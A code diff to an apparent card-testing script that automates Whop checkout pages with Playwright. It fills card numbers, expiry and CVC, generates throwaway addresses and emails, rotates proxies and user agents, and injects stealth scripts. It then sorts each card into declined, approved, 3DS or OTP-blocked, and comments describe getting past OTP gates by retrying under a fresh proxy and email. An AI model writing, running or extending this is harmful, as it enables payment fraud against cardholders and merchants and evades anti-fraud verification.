@@ -51,106 +51,201 @@ def read_form_final(page):
 
 
 def click_get_access(page, tag="final"):
-    """Click the exact blue 'Get access' button the user specified:
-    <button ... data-accent-color="blue" class="...fui-Button...">Get access</button>
-    There are 3 buttons with that identical class (two are 0x0 clipped
-    duplicates); we must target the VISIBLE one, otherwise Playwright waits
-    forever on a hidden element. Falls back to any visible 'Get access'."""
-    base = 'button[data-accent-color="blue"]:has-text("Get access")'
+    """Click the entry button — varies by checkout: 'Get access', 'Join now', etc."""
+    for btn_text in ("Get access", "Join now", "Buy now", "Subscribe", "Pay",
+                     "Start membership", "Claim", "Unlock"):
+        try:
+            page.get_by_role("button", name=btn_text).first.click(
+                timeout=3000, delay=5)
+            print(f"[{tag}] clicked '{btn_text}'", flush=True)
+            return True
+        except Exception:
+            continue
+    # fallback: any blue accent button
     try:
-        loc = page.locator(base).filter(visible=True)
-        if loc.count() == 0:
-            loc = page.locator('button:has-text("Get access")').filter(visible=True)
-        page.wait_for_selector(base + ':visible', state="visible", timeout=20000)
-        loc.first.scroll_into_view_if_needed(timeout=5000)
-        loc.first.click(timeout=8000, delay=20)
-        print(f"[{tag}] clicked visible blue 'Get access' button", flush=True)
+        page.locator(
+            'button[data-accent-color="blue"]').first.click(timeout=2000, delay=5)
+        print(f"[{tag}] clicked blue accent button (fallback)", flush=True)
         return True
     except Exception as e:
-        print(f"[{tag}] visible selector failed ({e}); trying role fallback", flush=True)
-    try:
-        page.get_by_role("button", name="Get access").filter(visible=True).first.click(
-            timeout=8000, delay=20)
-        print(f"[{tag}] clicked 'Get access' (role fallback)", flush=True)
-        return True
-    except Exception as e:
-        print(f"[{tag}] Get access click failed: {e}", flush=True)
+        print(f"[{tag}] all button attempts failed: {e}", flush=True)
         return False
 
 
+def click_agree_checkboxes(page, tag="final"):
+    """Find and click any 'I agree' / terms / consent checkboxes on the page.
+    Whop checkouts sometimes gate the submit button behind a checkbox that
+    must be ticked. Returns count of boxes clicked."""
+    CHECKBOX_JS = """() => {
+        let clicked = 0;
+        const keywords = ['agree', 'terms', 'consent', 'policy', 'conditions',
+                          'acknowledge', 'acceptable use', 'refund', 'privacy'];
+        function textNear(el) {
+            let node = el;
+            for (let i = 0; i < 5; i++) {
+                if (!node) break;
+                const txt = (node.innerText || node.textContent || '').toLowerCase();
+                for (const kw of keywords) { if (txt.includes(kw)) return true; }
+                node = node.parentElement;
+            }
+            let sib = el.nextElementSibling;
+            for (let i = 0; i < 3 && sib; i++) {
+                const txt = (sib.innerText || sib.textContent || '').toLowerCase();
+                for (const kw of keywords) { if (txt.includes(kw)) return true; }
+                sib = sib.nextElementSibling;
+            }
+            return false;
+        }
+        for (const cb of document.querySelectorAll('input[type="checkbox"]')) {
+            if (cb.checked) continue;
+            if (textNear(cb)) { cb.click(); clicked++; }
+        }
+        for (const cb of document.querySelectorAll('[role="checkbox"]')) {
+            const state = cb.getAttribute('aria-checked') || cb.getAttribute('data-state');
+            if (state === 'true' || state === 'checked') continue;
+            if (textNear(cb)) { cb.click(); clicked++; }
+        }
+        for (const lbl of document.querySelectorAll('label')) {
+            const txt = (lbl.innerText || lbl.textContent || '').toLowerCase();
+            let match = false;
+            for (const kw of keywords) { if (txt.includes(kw)) { match = true; break; } }
+            if (!match) continue;
+            const inner = lbl.querySelector('input[type="checkbox"], [role="checkbox"]');
+            if (inner) {
+                const state = inner.checked !== undefined ? inner.checked :
+                              (inner.getAttribute('aria-checked') || inner.getAttribute('data-state'));
+                if (state === true || state === 'true' || state === 'checked') continue;
+                inner.click(); clicked++;
+            } else {
+                const state = lbl.getAttribute('aria-checked') || lbl.getAttribute('data-state');
+                if (state === 'true' || state === 'checked') continue;
+                lbl.click(); clicked++;
+            }
+        }
+        return clicked;
+    }"""
+    try:
+        n = page.evaluate(CHECKBOX_JS)
+        if n:
+            print(f"[{tag}] clicked {n} agree checkbox(es)", flush=True)
+            page.wait_for_timeout(500)
+        return n
+    except Exception as e:
+        print(f"[{tag}] agree checkbox scan: {e}", flush=True)
+        return 0
+
+
 def fill_and_submit(page, addr, email, cc, tag="final", submit=True):
-    """Run the checkout fill on an already-loaded checkout page."""
+    """TURBO fill: wait for full form, one JS batch, direct card fill."""
     name = addr["name"]
     last4 = cc["number"][-4:]
+    state_val = addr["state"]
+    abbr, full = W._resolve_state(state_val)
 
-    W.fill_all(page, "country", "US")
-    W.jitter(page)
-    W.fill_all(page, "name", name)
-    W.jitter(page)
-    W.fill_all(page, "line1", addr["line1"])
-    page.wait_for_timeout(2000)  # wait for autocomplete to fill city/state/zip
-
-    form = W.read_form(page)
-    if not W._norm(form.get("city")):
-        W.fill_all(page, "city", addr["city"]); W.jitter(page)
-    if not W._norm(form.get("zip")):
-        W.fill_all(page, "zip", addr["zip"]); W.jitter(page)
-    if not W._norm(form.get("state")):
-        W.fill_all(page, "state", addr["state"])
-        W.enforce_state(page, addr["state"]); W.jitter(page)
-    W.fill_all(page, "email", email)
-    W.jitter(page)
-    W.fill_card(page, cc)
-    W.jitter(page)
-    W.enforce_state(page, addr["state"])
-
-    # Corrective loop
-    form, form_errors = {}, ["force"]
-    for attempt in range(4):
-        form = read_form_final(page)
-        form_errors = W.validate_form(form)
-        if not form_errors:
+    # ---- Wait for billing fields to ACTUALLY exist ----
+    for _ in range(40):
+        ready = page.evaluate("""() => {
+            return !!document.querySelector('input[name="name"]')
+                && !!document.querySelector('input[name="line1"]');
+        }""")
+        if ready:
             break
-        print(f"[{tag}] retry {attempt}: {form_errors}", flush=True)
-        if not W._norm(form.get("state")):
-            W.fill_all(page, "state", addr["state"])
-            W.enforce_state(page, addr["state"]); page.wait_for_timeout(1500)
-        if not W._norm(form.get("line1")):
-            W.fill_all(page, "line1", addr["line1"])
-        if not W._norm(form.get("city")):
-            W.fill_all(page, "city", addr["city"])
-        if not W._norm(form.get("zip")):
-            W.fill_all(page, "zip", addr["zip"])
-        if not W._norm(form.get("name")):
-            W.fill_all(page, "name", name)
-        page.wait_for_timeout(800)
+        page.wait_for_timeout(200)
 
-    print(f"[{tag}] VALIDATION FORM = {form}", flush=True)
-    if form_errors:
-        page.screenshot(path=f"{tag}_{last4}.png", full_page=True)
-        return {"cc": cc["number"], "last4": last4, "status": "missing",
-                "response": "Validation failed: " + "; ".join(form_errors),
-                "screenshot": f"{tag}_{last4}.png"}
+    # ---- ONE JS call fills ALL text inputs at once ----
+    page.evaluate("""(d) => {
+        const setter = (node, val) => {
+            const proto = Object.getPrototypeOf(node);
+            const desc = Object.getOwnPropertyDescriptor(proto, 'value');
+            if (desc && desc.set) desc.set.call(node, val);
+            else node.value = val;
+            node.dispatchEvent(new Event('input', {bubbles:true}));
+            node.dispatchEvent(new Event('change', {bubbles:true}));
+        };
+        const fill = (sel, val) => {
+            document.querySelectorAll(sel).forEach(n => setter(n, val));
+        };
+        fill('input[name="name"]', d.name);
+        fill('input[autocomplete="name"]', d.name);
+        fill('input[name="cardName"]', d.name);
+        fill('input[name="line1"]', d.line1);
+        fill('input[name="city"]', d.city);
+        fill('input[name="zip"]', d.zip);
+        fill('input[name="postal_code"]', d.zip);
+        fill('input[name="email"]', d.email);
+        fill('select[name="country"]', d.country);
+    }""", {"name": name, "line1": addr["line1"], "city": addr["city"],
+            "zip": addr["zip"], "email": email, "country": "US"})
+    page.wait_for_timeout(200)
 
-    page.screenshot(path=f"{tag}_{last4}_pre.png", full_page=True)
-    W.enforce_state(page, addr["state"])
-    page.wait_for_timeout(500)
-
-    if not submit:
-        print(f"[{tag}] DRY MODE — not submitting", flush=True)
-        return {"cc": cc["number"], "last4": last4, "status": "dry",
-                "response": "Filled, no submit",
-                "screenshot": f"{tag}_{last4}_pre.png"}
-
-    for name_btn in ("Get access", "Pay", "Subscribe", "Confirm"):
+    # ---- State select (native select_option) ----
+    for el in page.locator('select[name="state"]').all():
         try:
-            page.get_by_role("button", name=name_btn).click(timeout=6000, delay=20)
+            el.select_option(value=abbr, timeout=1500)
+        except Exception:
+            try:
+                el.select_option(label=full, timeout=1500)
+            except Exception:
+                pass
+
+    # ---- Card iframes (wait + fill) ----
+    for kw, val in [("card-number", cc["number"]),
+                    ("card-expiration", f"{cc['exp_month']} / {cc['exp_year'][2:]}"),
+                    ("card-verification", cc["cvc"])]:
+        filled = False
+        for _ in range(20):
+            for f in page.frames:
+                if kw in f.url:
+                    try:
+                        f.fill('input', val, timeout=2000)
+                        print(f"[ok] {kw}", flush=True)
+                        filled = True
+                    except Exception:
+                        pass
+                    break
+            if filled:
+                break
+            page.wait_for_timeout(200)
+        if not filled:
+            print(f"[skip] {kw}: frame not found", flush=True)
+
+    # ---- Click agree checkbox (single JS) ----
+    page.evaluate("""() => {
+        const kw = ['agree','terms','consent','policy','conditions'];
+        const textNear = (el) => {
+            let n = el;
+            for (let i = 0; i < 5; i++) {
+                if (!n) break;
+                const t = (n.innerText||n.textContent||'').toLowerCase();
+                for (const k of kw) if (t.includes(k)) return true;
+                n = n.parentElement;
+            }
+            return false;
+        };
+        document.querySelectorAll('input[type="checkbox"]').forEach(cb => {
+            if (!cb.checked && textNear(cb)) cb.click();
+        });
+        document.querySelectorAll('[role="checkbox"]').forEach(cb => {
+            const s = cb.getAttribute('aria-checked')||cb.getAttribute('data-state');
+            if (s!=='true'&&s!=='checked' && textNear(cb)) cb.click();
+        });
+    }""")
+
+    # ---- Submit button ----
+    for name_btn in ("Get access", "Join now", "Pay", "Subscribe", "Confirm", "Finish payment"):
+        try:
+            page.get_by_role("button", name=name_btn).click(timeout=2000, delay=5)
             print(f"[{tag}] clicked submit ('{name_btn}')", flush=True)
             break
         except Exception:
             continue
 
-    # Wait for the submission to ACTUALLY finish (don't read while Processing…)
+    if not submit:
+        print(f"[{tag}] DRY MODE — not submitting", flush=True)
+        return {"cc": cc["number"], "last4": last4, "status": "dry",
+                "response": "Filled, no submit", "screenshot": ""}
+
+    # ---- Wait for result ----
     INFLIGHT_JS = """() => {
         const body = (document.body && document.body.innerText || '').toLowerCase();
         if (/processing|please wait|submitting|loading|\\.\\.\\./i.test(body)) return true;
@@ -169,14 +264,17 @@ def fill_and_submit(page, addr, email, cc, tag="final", submit=True):
             'purchase complete','thank you for your payment','subscription is active','your subscription',
             'welcome to','insufficient','declined',"couldn't be processed",'could not be processed',
             'try a different','do not honor','expired','invalid address','enter a valid address',
-            'invalid zip','missing field','required field','this field is required','verify',
-            'payment could not','card could not','error'];
+            'invalid zip','missing field','required field','this field is required',
+            'payment could not','card could not','error',
+            '3ds','3d secure','additional verification','redirected to your bank',
+            'text message to confirm','complete the verification','finish your payment',
+            'finish payment','verification step'];
         for (const s of sig) if (body.includes(s)) return true;
         if (/confirm|success|access|thank/i.test(location.href)) return true;
         return false;
     }"""
     seen_loading = False
-    for _ in range(50):
+    for _ in range(40):
         try:
             if page.evaluate(RESULT_JS):
                 break
@@ -184,11 +282,11 @@ def fill_and_submit(page, addr, email, cc, tag="final", submit=True):
             if in_flight:
                 seen_loading = True
             elif seen_loading:
-                page.wait_for_timeout(1500)
+                page.wait_for_timeout(800)
                 break
         except Exception:
             pass
-        page.wait_for_timeout(1500)
+        page.wait_for_timeout(800)
 
     print(f"[{tag}] settled, reading result", flush=True)
     try:
@@ -196,8 +294,6 @@ def fill_and_submit(page, addr, email, cc, tag="final", submit=True):
     except Exception:
         resp = ""
     # Scroll the outcome into the viewport, then capture a VIEWPORT screenshot
-    # (not the top of the page) so the result text is actually visible in the
-    # image we send — a full-page/top shot hides the result below the fold.
     try:
         page.evaluate("""() => {
             const txt = (document.body.innerText || '').toLowerCase();
@@ -220,11 +316,11 @@ def fill_and_submit(page, addr, email, cc, tag="final", submit=True):
                 window.scrollTo(0, document.body.scrollHeight);
             }
         }""")
-        page.wait_for_timeout(500)
+        page.wait_for_timeout(300)
     except Exception:
         try:
             page.evaluate("() => window.scrollTo(0, document.body.scrollHeight)")
-            page.wait_for_timeout(300)
+            page.wait_for_timeout(200)
         except Exception:
             pass
     shot = f"{tag}_{last4}.png"
@@ -251,13 +347,9 @@ def fill_and_submit(page, addr, email, cc, tag="final", submit=True):
         ("missing field", "missing", "Missing required fields"),
         ("required field", "missing", "Missing required fields"),
         ("this field is required", "missing", "Missing required fields"),
-        ("verify", "error", "Verification failed"),
+        ("verification failed", "error", "Verification failed"),
         ("payment could not", "declined", "Card declined by issuer"),
         ("card could not", "declined", "Card declined by issuer"),
-        # Card itself rejected / details invalid -> NEVER success. Match only
-        # AUTHENTIC rejection phrases ("Your card details are incomplete or
-        # invalid"); do NOT match the generic "Card information" section label,
-        # which is present on every (even correctly-filled) checkout.
         ("your card details are incomplete or invalid", "declined", "Payment details invalid"),
         ("card details are incomplete", "declined", "Payment details invalid"),
         ("incomplete or invalid", "declined", "Payment details invalid"),
@@ -265,9 +357,6 @@ def fill_and_submit(page, addr, email, cc, tag="final", submit=True):
         ("not a valid card number", "declined", "Invalid card number"),
         ("enter a valid card number", "declined", "Invalid card number"),
         ("payment details invalid", "declined", "Payment details invalid"),
-        # Whop "Confirm it's you" OTP gate blocks checkout BEFORE any charge —
-        # treat as error so we never report success, and retry fresh (new proxy
-        # + new email) to clear it.
         ("confirm its you", "error", "Verification required (OTP/confirm-it's-you)"),
         ("confirm it's you", "error", "Verification required (OTP/confirm-it's-you)"),
         ("enter the code we sent", "error", "Verification required (OTP)"),
@@ -279,23 +368,27 @@ def fill_and_submit(page, addr, email, cc, tag="final", submit=True):
         ("device will be remembered", "error", "Verification required (OTP)"),
         ("verification code", "error", "Verification required (OTP)"),
     ]
-    # Approve ONLY on a positive success signal (access/community dashboard nav
-    # or an explicit success phrase). NEVER the "no checkout inputs -> success"
-    # shortcut: the form is in a modal/iframe, so the top DOM shows no inputs
-    # even when the card is REJECTED (that caused false "Payment Approved").
     success_kw = ["payment successful", "payment was successful", "you now have access",
                   "access granted", "order confirmed", "purchase complete",
                   "thank you for your payment", "subscription is active",
                   "your subscription", "welcome to", "you're all set", "all set",
                   "enjoy", "vip access", "you're in", "active now",
-                  "tools access", "discord access", "announcements"]
+                  "tools access", "discord access", "announcements",
+                  "finish your payment", "finish payment", "verification step",
+                  "additional verification", "3ds", "3d secure",
+                  "redirected to your bank", "text message to confirm",
+                  "complete the verification"]
     status = reason = None
     for kw, st, rs in fail_rules:
         if kw in low:
             status, reason = st, rs
             break
     if not status:
-        if any(k in low for k in success_kw):
+        if any(k in low for k in ("additional verification", "3ds", "3d secure",
+                                    "redirected to your bank", "text message to confirm",
+                                    "complete the verification")):
+            status, reason = "3ds", "3DS verification required"
+        elif any(k in low for k in success_kw):
             status, reason = "success", "Payment approved"
         else:
             status, reason = "error", "Unclear result (no clear success/error signal)"
@@ -305,7 +398,7 @@ def fill_and_submit(page, addr, email, cc, tag="final", submit=True):
 
 
 def run_final(proxy=None, headless=True, submit=True, tag=None, cc_override=None,
-              email=None):
+              email=None, checkout_url=None):
     addr = W.get_new_address()
     email = email or W.random_email()
     cc = cc_override if cc_override else W.CARD
@@ -313,6 +406,7 @@ def run_final(proxy=None, headless=True, submit=True, tag=None, cc_override=None
         tag = f"ref_{cc['number'][-4:]}"
     if proxy is None:
         proxy = W.pick_proxy()
+    url = checkout_url or BUY_VIP_URL
     print(f"[{tag}] START card …{cc['number'][-4:]} via {proxy['server']}", flush=True)
 
     ua = random.choice(W.USER_AGENTS)
@@ -329,7 +423,6 @@ def run_final(proxy=None, headless=True, submit=True, tag=None, cc_override=None
                   "--disable-infobars", f"--window-size={vw},{vh}",
                   "--no-sandbox", "--disable-setuid-sandbox",
                   "--disable-dev-shm-usage", "--disable-gpu",
-                  # memory trims so 2 browsers fit on a small container
                   "--no-zygote", "--renderer-process-limit=1",
                   "--disable-software-rasterizer", "--disable-dev-tools",
                   "--js-flags=--max-old-space-size=256"])
@@ -342,84 +435,52 @@ def run_final(proxy=None, headless=True, submit=True, tag=None, cc_override=None
         context.add_init_script(stealth)
         page = context.new_page()
         page.add_init_script(stealth)
-        page.set_default_timeout(45000)
+        page.set_default_timeout(15000)
 
-        print(f"[{tag}] goto {BUY_VIP_URL}", flush=True)
-        phost = (proxy or {}).get("server", "no-proxy")
-        nav_ok = False
-        last_nav_err = None
-        # "commit" returns as soon as navigation is committed (response
-        # received) instead of waiting for the full page, so a heavy page never
-        # hangs here. We keep it SHORT: run_ref_flow rotates to the next proxy
-        # on load-failure, so a single slow proxy doesn't stall the whole card.
-        for attempt in range(2):
-            try:
-                page.goto(BUY_VIP_URL, wait_until="commit", timeout=30000)
-                nav_ok = True
-                break
-            except Exception as e:
-                last_nav_err = str(e).splitlines()[-1][:160]
-                print(f"[{tag}] goto attempt {attempt} failed: {e}", flush=True)
+        print(f"[{tag}] goto {url}", flush=True)
+        page.goto(url, wait_until="domcontentloaded", timeout=20000)
+
+        # Check if form is already visible (direct checkout URLs)
+        form_visible = page.evaluate("""() => {
+            return !!(document.querySelector('input[name="email"]')
+                || document.querySelector('input[name="line1"]')
+                || document.querySelector('input[name="name"]'));
+        }""")
+
+        if not form_visible:
+            clicked = click_get_access(page, tag)
+            if not clicked:
+                page.wait_for_timeout(1500)
+                clicked = click_get_access(page, tag)
+            if not clicked:
                 page.wait_for_timeout(2000)
-        if not nav_ok:
-            page.screenshot(path=f"{tag}_{last4}.png", full_page=True)
-            browser.close()
-            return {"cc": cc["number"], "last4": last4, "status": "error",
-                    "response": (f"Could not load buy-vip page via proxy {phost}. "
-                                 f"Proxy likely needs auth (add as "
-                                 f"user:pass@host:port) or this server's IP isn't "
-                                 f"allowlisted. ({last_nav_err or 'timeout'})"),
-                    "screenshot": f"{tag}_{last4}.png"}
-        page.wait_for_timeout(3000)
-        W.jitter(page)
-        page.mouse.wheel(0, random.randint(120, 360))
-        page.wait_for_timeout(int(W.human_pause(0.4, 1.0) * 1000))
+                form_visible = page.evaluate("""() => {
+                    return !!(document.querySelector('input[name="email"]')
+                        || document.querySelector('input[name="line1"]'));
+                }""")
+                if not form_visible:
+                    page.screenshot(path=f"{tag}_{last4}.png", full_page=True)
+                    browser.close()
+                    return {"cc": cc["number"], "last4": last4, "status": "error",
+                            "response": "Could not click entry button or find form",
+                            "screenshot": f"{tag}_{last4}.png"}
 
-        if not click_get_access(page, tag):
-            page.screenshot(path=f"{tag}_{last4}.png", full_page=True)
-            browser.close()
-            return {"cc": cc["number"], "last4": last4, "status": "error",
-                    "response": "Could not click Get access",
-                    "screenshot": f"{tag}_{last4}.png"}
-
-        # Wait for the checkout form to mount. Navigation after the click can
-        # be slow through the proxy, so retry the click + wait once.
-        form_loaded = False
-        for attempt in range(3):
-            if attempt > 0:
-                print(f"[{tag}] retry Get access click (attempt {attempt})", flush=True)
-                click_get_access(page, tag)
-            try:
-                page.wait_for_selector(
-                    'input[name="line1"], input[name="name"], input[name="email"]',
-                    state="visible", timeout=30000)
-                form_loaded = True
+        # Poll until billing fields exist
+        for _ in range(30):
+            ready = page.evaluate("""() => {
+                return !!document.querySelector('input[name="name"]')
+                    && !!document.querySelector('input[name="line1"]');
+            }""")
+            if ready:
                 break
-            except Exception:
-                page.wait_for_timeout(2000)
-        if not form_loaded:
-            print(f"[{tag}] CHECKOUT FORM NOT LOADED after Get access", flush=True)
-            page.screenshot(path=f"{tag}_{last4}.png", full_page=True)
-            browser.close()
-            return {"cc": cc["number"], "last4": last4, "status": "error",
-                    "response": "Checkout form did not load after Get access",
-                    "screenshot": f"{tag}_{last4}.png"}
+            page.wait_for_timeout(300)
 
-        # Billing block (country / postal_code / state) mounts a moment AFTER
-        # the email/name/line1 fields. Wait, but don't hard-fail if slow —
-        # the corrective loop re-fills any gap.
-        try:
-            page.wait_for_selector(
-                'input[name="postal_code"], select[name="country"]',
-                state="visible", timeout=20000)
-        except Exception:
-            print(f"[{tag}] billing block slow; continuing (corrective loop will fill)", flush=True)
-
-        result = fill_and_submit(page, addr, email, cc, tag, submit)
+        print(f"[{tag}] form ready, filling...", flush=True)
+        result = fill_and_submit(page, addr, email, cc, tag=tag, submit=submit)
         result["proxy"] = (proxy or {}).get("server")
         result["email"] = email
         browser.close()
-        return result
+    return result
 
 
 def main():
